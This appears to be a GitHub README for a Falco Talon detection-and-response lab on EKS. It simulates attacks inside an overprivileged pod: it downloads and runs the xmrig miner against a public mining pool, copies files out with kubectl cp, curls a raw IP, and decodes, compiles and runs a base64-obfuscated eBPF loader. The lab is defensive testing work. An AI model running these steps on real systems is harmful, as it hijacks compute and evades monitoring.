# Responding to threats in realtime with Falco Talon
The lab should be reproducable for all EKS users. <br/>
The cluster runs ```cilium cni``` for network traffic control in EKS <br/>
Falco Talom is created in the same ```falco``` netwok namespace as OSS Falco.

Set up an ```AWS-CLI Profile``` in order to interact with AWS services via my local workstation
```
aws configure --profile nigel-aws-profile
export AWS_PROFILE=nigel-aws-profile                                            
aws sts get-caller-identity --profile nigel-aws-profile
aws eks update-kubeconfig --region eu-west-1 --name falco-cluster
```

## Create EKS Cluster with Cilium CNI

```
eksctl create cluster --name falco-cluster --without-nodegroup
```

<img width="919" alt="Screenshot 2023-12-13 at 20 22 38" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/e3e82de6-8da6-4d14-a83c-a1efed4ea685">


Once ```aws-node``` DaemonSet is deleted, EKS will not try to restore it.
```
kubectl -n kube-system delete daemonset aws-node
```

Setup Helm repository:
```
helm repo add cilium https://helm.cilium.io/
```

Deploy Cilium release via Helm:
```
helm install cilium cilium/cilium --version 1.9.18 \
  --namespace kube-system \
  --set eni=true \
  --set ipam.mode=eni \
  --set egressMasqueradeInterfaces=eth0 \
  --set tunnel=disabled \
  --set nodeinit.enabled=true
```

<img width="919" alt="Screenshot 2023-12-13 at 20 44 34" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/0d725bae-e9f0-4710-8844-37ea5c86f4f6">


Create a node group since there are no worker nodes for our pods
```
eksctl create nodegroup --cluster falco-cluster --node-type t3.xlarge --nodes 1 --nodes-min=0 --nodes-max=3 --max-pods-per-node 58
```

<img width="1199" alt="Screenshot 2023-12-13 at 20 45 45" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/e0e9f120-3777-4ec1-a8e3-21be46abeb8e">


<img width="1199" alt="Screenshot 2023-12-13 at 20 51 27" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/c421c606-3570-4d66-ab90-2d2f218c165b">

```
mkdir falco-response
```

```
cd falco-response
```

Download the ```custom-rules.yaml``` file - this enables the by default disabled ```Detect outbound connections to common miner pool ports``` Falco Rule. <br/>
However, I see to be breaking the deployment with the below ```custom-rules.yaml``` file, so I'm leaving it out for now.
```
wget https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/falco-talon/custom-rules.yaml
```

## Install Falco and FalcoSideKick

```
helm install falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  --set falcosidekick.config.webhook.address=http://falco-talon:2803 \
  --set "falcoctl.config.artifact.install.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/rules.d,/etc/falco/falco-rules.yaml,/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml}" \
  -f custom-rules.yaml
```

<img width="1199" alt="Screenshot 2023-12-13 at 20 54 12" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/245f4b4d-f1e3-422f-827c-24679c86c1ee">


## Install Falco Talon

```
git clone https://github.com/Issif/falco-talon.git
```

The Talon rules file ```rules.yaml``` is located in the ```helm``` directory:
```
cd falco-talon/deployment/helm/
```

Deploy Talon into the newly created ```falco``` network namespace:
```
helm install falco-talon . -n falco
```

```
kubectl get pods -n falco
```

<img width="1199" alt="Screenshot 2023-12-13 at 20 58 02" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/b26f6857-ad33-4fe4-8b7a-d904ccd2c2c1">

Now that Talon is installed successfully, let's play around with the rule logic.

## Building custom rules for Falco Talon

```
rm rules.yaml
```

```
wget https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/falco-talon/rules.yaml
```

```
cat rules.yaml
```

Talon can be removed at any time via:
```
helm uninstall falco-talon -n falco
```
You'd need to uninstall Falco separately to Talon:
```
helm uninstall falco -n falco
```

Reload Talon to recognize the changed rules without any issues (granted Falco is already installed):
```
helm install falco-talon . -n falco
```

## Check for killed process in realtime
Run this command command in the second window:
```
kubectl get events -n default
```

## Kill stratum protocol in realtime

Create a dodgy, overprivleged workload:
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
```
kubectl exec -it dodgy-pod -- bash
```
Download the miner from Github
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```
Unzip xmrig package:
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```
```
cd xmrig-6.16.4
```
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```

![Screenshot 2023-12-13 at 21 47 01](https://github.com/nigel-falco/falco-talon-testing/assets/152274017/9992baaa-0969-4e4e-b214-92fe62adbc94)

## Testing the Script response action

Copy file from a container and trigger a ```Kubernetes Client Tool Launched in Container``` detection in Falco: <br/>
https://thomas.labarussias.fr/falco-rules-explorer/?status=enabled&source=syscalls&maturity=all&hash=bc5091ab0698e22b68d788e490e8eb66

```
kubectl cp dodgy-pod:xmrig-6.16.4-linux-static-x64.tar.gz ~/desktop/xmrig-6.16.4-linux-static-x64.tar.gz
```


## Enforce Network Policy on Suspicious Traffic

```
kubectl exec -it dodgy-pod -- bash
```

Installing a suspicious networking tool like telnet
```
curl 52.21.188.179
```

![Screenshot 2023-12-15 at 15 41 55](https://github.com/nigel-falco/falco-talon-testing/assets/152274017/f46b80a5-89e2-448e-9560-a4e7b070bc99)

Check to confirm the IP address was blocked:
```
kubectl get networkpolicy dodgy-pod -o yaml
```

<img width="699" alt="Screenshot 2023-12-20 at 12 02 38" src="https://github.com/nigel-falco/falco-talon-testing/assets/152274017/a5fdecad-292d-4597-8a18-13867cc40e73">

```
kubectl delete networkpolicy dodgy-pod
```

<br/><br/>

## Expose the Falcosidekick UI
```
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
```

<br/><br/>

## Trigger eBPF Program Injection
eBPF presents malware authors with a whole new set of tools, most of which are not understood well by the masses. 
This repository aims to introduce readers to what eBPF is and examine some of the basic building blocks of eBPF-based malware. 
We’ll close with thoughts on how to prevent and detect this emerging trend in malware.<br/>
https://redcanary.com/blog/ebpf-malware/

<br/><br/>

Stored the ```threatgen``` tool locally in a file called ```stg.yaml```
```
kubectl apply -f stg.yaml -n loadbpf
```
Check which deployment is associated with the recent eBPF Injection attempt.
```
kubectl get deployments -A -o wide | grep threatgen
```
Check that the pod is actually running without any issues:
```
kubectl get pods -n loadbpf -w
```
Shell into the container that performed the recent eBPF Injection attempt.
```
kubectl exec -it -n loadbpf deploy/threatgen -- bash
```
STG keeps crashing in my CentOS pod, so I cannot rely on this for my demo:
```
kubectl delete -f stg.yaml -n loadbpf
```
I checked the health status of the pod when running, and the injection is via Atomic Red:
```
kubectl logs -n loadbpf threatgen-7ff85df9f6-vjfdh
```
Outputs of Atomic Red:
```
Starting LOAD.BPF.PROG
PathToAtomicsFolder = /root/AtomicRedTeam/atomics

GetPrereq's for: LOAD.BPF.PROG-1 Test
No Preqs Defined
PathToAtomicsFolder = /root/AtomicRedTeam/atomics

Executing test: LOAD.BPF.PROG-1 Test
Done executing test: LOAD.BPF.PROG-1 Test
PathToAtomicsFolder = /root/AtomicRedTeam/atomics

Executing cleanup for test: LOAD.BPF.PROG-1 Test
Done executing cleanup for test: LOAD.BPF.PROG-1 Test
Completed 1 tests. sleeping 10.
Friday 01/05/2024 18:29 +00
```
If it crashes, I need to better understand why the program crashes:
```
kubectl logs -n loadbpf [POD_NAME] --previous
```

I wrote an article on eBPF injections using Atomic Red tests. Let's just do it this way: <br/>
https://www.blackhillsinfosec.com/real-time-threat-detection-for-kubernetes-with-atomic-red-tests-and-falco/
<br/><br/>




Before we start the deployment, remember to create the ```atomic-red``` network namespace.
```
kubectl create ns atomic-red
```
Creating the ```Atomic Red deployment``` into the correct network namespace:
```
Kubectl apply -f https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/kubernetes/k8s-deployment.yaml -n atomic-red
```
```
kubectl get pods -n atomic-red
```
```
kubectl get deployments -A -o wide | grep atomic-red
```
Open up a new terminal window for the shell session:
```
kubectl exec -it -n atomic-red deploy/atomicred -- bash
```
```
pwsh
```

<br/><br/>

### Running the eBPF simulation in Atomic Red
Now, you can finally load the Atomic Red Team module:
```
Import-Module "~/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1" -Force
```
Check the details of the TTPs:
```
Invoke-AtomicTest <bpf-id> -ShowDetails
```
Check the prerequisites to ensure the test conditions are right:
```
Invoke-AtomicTest <bpf-id> -GetPreReqs
```
Remove the feature flags to execute the test simulation.
```
Invoke-AtomicTest <bpf-id>
```

<br/><br/>

### Running the eBPF simulation manually
Create a dodgy, overprivleged workload:
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
Shell into the ```dodgy pod```:
```
kubectl exec -it dodgy-pod -- bash
```
If you ```cannot prepare internal mirrorlist``` simply run the below modifications
```
cd /etc/yum.repos.d/
sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
```
You need to install ```gcc``` on the ```centos``` pod:
```
dnf install gcc
```
Downloaded the ```eBPF``` program code in ```Base64-encoded format``` to avoid traditional detection methods:
```
echo I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxsaW51eC9icGYuaD4KCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikKewogICAgaW50IG47CiAgICBpbnQgYmZkLCBwZmQ7CiAgICBzdHJ1Y3QgYnBmX2luc24gKmluc247CiAgICB1bmlvbiBicGZfYXR0ciBhdHRyOwogICAgY2hhciBsb2dfYnVmWzQwOTZdOwogICAgY2hhciBidWZbXSA9ICJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCI7CgogICAgaW5zbiA9IChzdHJ1Y3QgYnBmX2luc24qKWJ1ZjsKICAgIGF0dHIucHJvZ190eXBlID0gQlBGX1BST0dfVFlQRV9LUFJPQkU7CiAgICBhdHRyLmluc25zID0gKHVuc2lnbmVkIGxvbmcpaW5zbjsKICAgIGF0dHIuaW5zbl9jbnQgPSBzaXplb2YoYnVmKSAvIHNpemVvZihzdHJ1Y3QgYnBmX2luc24pOwogICAgYXR0ci5saWNlbnNlID0gKHVuc2lnbmVkIGxvbmcpIkdQTCI7CiAgICBhdHRyLmxvZ19zaXplID0gc2l6ZW9mKGxvZ19idWYpOwogICAgYXR0ci5sb2dfYnVmID0gKHVuc2lnbmVkIGxvbmcpbG9nX2J1ZjsKICAgIGF0dHIubG9nX2xldmVsID0gMTsKICAgIGF0dHIua2Vybl92ZXJzaW9uID0gMjY0NjU2OwoKICAgIHBmZCA9IHN5c2NhbGwoU1lTX2JwZiwgQlBGX1BST0dfTE9BRCwgJmF0dHIsIHNpemVvZihhdHRyKSk7CiAgICBjbG9zZShwZmQpOwoKICAgIHJldHVybiAwOwp9Cg== | base64 -d > /tmp/prog.c
```

```gcc``` stands for the ```GNU Compiler Collection```, which is a robust suite of compilers for various programming languages, most notably C and C++. It converts the assembly code into machine code in the form of object files (```.o files```). It's important to clarify that gcc itself does not directly load eBPF programs into the kernel. Instead, it compiles a higher-level language (like C) into a form that can then be translated into eBPF bytecode, which is what the Linux kernel understands and executes. Running the below command definitely triggers the eBPF injection attempt rule:
```
gcc /tmp/prog.c -o /tmp/prog && /tmp/prog
```

You can see the contents of the script by decoded the Base64 script
```
echo 'I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxsaW51eC9icGYuaD4KCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikKewogICAgaW50IG47CiAgICBpbnQgYmZkLCBwZmQ7CiAgICBzdHJ1Y3QgYnBmX2luc24gKmluc247CiAgICB1bmlvbiBicGZfYXR0ciBhdHRyOwogICAgY2hhciBsb2dfYnVmWzQwOTZdOwogICAgY2hhciBidWZbXSA9ICJceDk1XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCI7CgogICAgaW5zbiA9IChzdHJ1Y3QgYnBmX2luc24qKWJ1ZjsKICAgIGF0dHIucHJvZ190eXBlID0gQlBGX1BST0dfVFlQRV9LUFJPQkU7CiAgICBhdHRyLmluc25zID0gKHVuc2lnbmVkIGxvbmcpaW5zbjsKICAgIGF0dHIuaW5zbl9jbnQgPSBzaXplb2YoYnVmKSAvIHNpemVvZihzdHJ1Y3QgYnBmX2luc24pOwogICAgYXR0ci5saWNlbnNlID0gKHVuc2lnbmVkIGxvbmcpIkdQTCI7CiAgICBhdHRyLmxvZ19zaXplID0gc2l6ZW9mKGxvZ19idWYpOwogICAgYXR0ci5sb2dfYnVmID0gKHVuc2lnbmVkIGxvbmcpbG9nX2J1ZjsKICAgIGF0dHIubG9nX2xldmVsID0gMTsKICAgIGF0dHIua2Vybl92ZXJzaW9uID0gMjY0NjU2OwoKICAgIHBmZCA9IHN5c2NhbGwoU1lTX2JwZiwgQlBGX1BST0dfTE9BRCwgJmF0dHIsIHNpemVvZihhdHRyKSk7CiAgICBjbG9zZShwZmQpOwoKICAgIHJldHVybiAwOwp9Cg==' | base64 -d
```

<br/><br/>

This is all fine and dandy, but without the various prerequisites already installed on the pod, the adversary could inject the BPF program into the kernel without any automation response. And as such, we need tools like ```bpftool``` to be dynamically installed on each pod as soon as we seen insecure BPF interactions in containers. We can achieve this with Falco Talon:
```
dnf install -y elfutils-libelf-devel libcap-devel zlib-devel binutils-devel bpftool
```


## Scale down the cluster
```
eksctl scale nodegroup --cluster falco-cluster --name ng-f792a52a --nodes 0
```
